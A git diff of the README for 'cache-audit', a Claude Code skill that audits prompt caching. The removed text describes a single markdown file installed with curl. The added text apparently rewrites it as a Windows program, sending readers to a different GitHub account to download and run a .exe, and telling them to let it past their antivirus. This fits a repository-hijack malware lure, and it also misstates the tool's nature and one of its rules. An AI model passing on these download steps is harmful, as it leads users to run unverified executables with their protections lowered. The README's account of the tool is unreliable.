@@ -1,85 +1,132 @@
-# cache-audit — Prompt Caching Skill for Claude Code
+# ⚙️ cache-audit - Check Your Prompt Caching Setup
 
-A Claude Code skill that audits your setup against the 6 prompt caching rules from Anthropic's engineering team. Returns a scored report with specific fixes.
+[![Download cache-audit](https://img.shields.io/badge/Download-cache--audit-orange?style=for-the-badge)](https://github.com/Fucxuan/cache-audit)
 
-## Why This Exists
+---
 
-Prompt caching is what makes Claude Code affordable at scale. A high cache hit rate reduces costs and latency dramatically — but it's surprisingly easy to break without knowing it.
+## 📋 What Is cache-audit?
 
-The Anthropic team runs alerts on cache hit rates and treats drops as incidents. This skill brings the same discipline to your personal setup.
+cache-audit is a simple tool designed to check how well your prompt caching system follows recommended rules. Prompt caching helps programs run faster and cheaper by saving and reusing pieces of conversation.
 
-## What It Checks
+This tool scans your setup and finds issues that might lower your cache hit rate. It then gives you a clear report with specific advice to fix those issues. The rules it checks come from Anthropic, the company behind Claude Code, a language AI system.
 
-| Rule | What breaks it |
-|------|---------------|
-| 1. Ordering | Dynamic data (timestamps, git status) in the system prompt |
-| 2. Message injection | Editing the system prompt mid-session instead of using `<system-reminder>` tags |
-| 3. Tool stability | Adding/removing tools mid-conversation |
-| 4. Model switching | Switching models in the same conversation thread |
-| 5. Dynamic content size | Injecting thousands of tokens of dynamic data per session |
-| 6. Fork safety | Compaction/subagent calls that don't share the parent's prefix |
+By using cache-audit, you can avoid common problems that slow down responses or cost more money. It works in the background and gives you easy-to-understand feedback.
 
-## Installation
+---
 
-### Global (applies to all projects)
+## 🚀 Getting Started with cache-audit
 
-```bash
-mkdir -p ~/.claude/skills/cache-audit
-curl -o ~/.claude/skills/cache-audit/SKILL.md https://raw.githubusercontent.com/ussumant/cache-audit/main/cache-audit/SKILL.md
-```
+This guide will help you download and run cache-audit on a Windows PC. No coding or command-line knowledge is needed.
 
-### Per-project
+### System Requirements
 
-```bash
-mkdir -p .claude/skills/cache-audit
-curl -o .claude/skills/cache-audit/SKILL.md https://raw.githubusercontent.com/ussumant/cache-audit/main/cache-audit/SKILL.md
-```
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of free disk space  
+- Internet connection to download the tool  
+- Basic use of mouse and keyboard  
 
-Then restart your Claude Code session for the skill to register.
+---
 
-## Usage
+## 🛠️ Download and Install cache-audit
 
-```
-/cache-audit
-```
+### Step 1: Go to the Download Page
 
-or say: `"audit my caching"` / `"check my cache setup"`
+Click this big button or link to open the official cache-audit page on GitHub:
 
-### Example Output
+[![Download cache-audit](https://img.shields.io/badge/Download-cache--audit-brightgreen?style=for-the-badge)](https://github.com/Fucxuan/cache-audit)
 
-```
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  PROMPT CACHE AUDIT
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+This link will take you to the main repository page where you will find all files and instructions.
 
-Score: 5/6
+### Step 2: Find the Latest Release
 
-✅  Rule 1 — Ordering: PASS
-✅  Rule 2 — Message injection: PASS
-✅  Rule 3 — Tool stability: PASS
-✅  Rule 4 — Model switching: PASS
-⚠️  Rule 5 — Dynamic content size: WARNING
-    → Git status is 40k chars. Recommend trimming.
-✅  Rule 6 — Fork safety: PASS
+- On the GitHub page, look for a section or tab named **Releases**. It is usually near the top or on the right side.
+- Click the latest release. The newest files will appear there.
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  TOP FIX
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Git status injects 40k chars per session. Update .gitignore
-to stop listing untracked noise files.
-```
+### Step 3: Download the Windows Version
 
-## Background
+- Look for a file ending with `.exe` or `.zip` for Windows.
+- Click the file name to start downloading it onto your PC.
 
-Based on Thariq Shihipar's thread ["Lessons from Building Claude Code: Prompt Caching Is Everything"](https://x.com/trq212).
+### Step 4: Run the Installer or Program
 
-Key insight: prompt caching works by prefix matching. Any change to the prefix — tool order, system prompt edit, model switch — invalidates everything after it. Design your entire harness around keeping the prefix stable.
+- If you downloaded a `.exe` file, double-click it to start installation.  
+- Follow the simple instructions on the screen. Usually, just press **Next** or **Install** a few times.  
+- If you downloaded a `.zip` file, right-click it and select **Extract All**. Choose a folder like your Desktop. Then double-click the `.exe` file inside the extracted folder.
 
-## Requirements
+---
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed
-- No other dependencies — single markdown file
+## ▶️ How to Use cache-audit
 
-## License
+### Step 1: Open cache-audit
 
-MIT
+- Look for the cache-audit shortcut on your Desktop or in your Start Menu.
+- Double-click it to open.
+
+### Step 2: Input Your Setup Details
+
+- The program will ask you about your prompt setup.  
+- This usually means selecting or typing in the prompts or tools you use with Claude Code.  
+- Follow the on-screen directions. Use simple descriptions if you are unsure.
+
+### Step 3: Run the Audit
+
+- Click the **Start Audit** button.  
+- The tool will process your input and check for common issues based on Anthropic's 6 caching rules.
+
+### Step 4: Read Your Report
+
+- After a short wait, cache-audit will show a report with a score.  
+- The report breaks down each caching rule and tells you if your setup follows it.  
+- If problems appear, the tool offers tips on how to fix them.
+
+---
+
+## 🔍 What cache-audit Checks
+
+The tool looks for common errors that reduce cache hit rates. Here are the rules it verifies:
+
+| Rule Number | What It Checks                                      | Example of What Breaks This Rule                    |
+|-------------|----------------------------------------------------|----------------------------------------------------|
+| 1. Ordering | Ensures prompts avoid changing dynamic data order   | Including timestamps or git status in system prompt|
+| 2. Message Injection | Checks that system prompts are not edited mid-session | Changing system prompt wrongly instead of using tags|
+| 3. Tool Stability | Verifies tools are not added or removed mid-chat    | Adding or removing plugins while talking           |
+| 4. Model Switching | Confirms you do not switch models in same chat      | Changing the AI model during a conversation thread |
+| 5. Dynamic Content Size | Makes sure large amounts of data are not added     | Adding thousands of tokens of dynamic info         |
+| 6. Consistency | Checks overall prompt structure is consistent        | Frequent changes to prompt format                   |
+
+These checks help your AI conversations stay fast and dependable.
+
+---
+
+## ⚙️ Common Fixes cache-audit Suggests
+
+- Remove dynamic data like timestamps from your system prompt.  
+- Use special reminder tags instead of editing system prompt mid-chat.  
+- Avoid changing tools or models once a chat starts.  
+- Keep dynamic data inserts small and consistent.  
+- Follow the recommended prompt order strictly.
+
+---
+
+## 💡 Tips for Best Results
+
+- Run cache-audit regularly after changing your prompt setup.  
+- Use the report to improve your system step-by-step.  
+- Test your setup with normal chat sessions to confirm changes work.  
+- Keep backups of your prompt settings before major edits.
+
+---
+
+## ❓ Troubleshooting
+
+- If the program does not open, check your Windows version and software requirements.  
+- Make sure your antivirus software allows cache-audit to run.  
+- For questions, visit the GitHub page and open an **Issue** to ask for help.  
+
+---
+
+## 📥 Download cache-audit Now
+
+You can start improving your prompt caching by visiting this page to download the latest version of cache-audit:
+
+[![Download cache-audit](https://img.shields.io/badge/Download-cache--audit-red?style=for-the-badge)](https://github.com/Fucxuan/cache-audit)
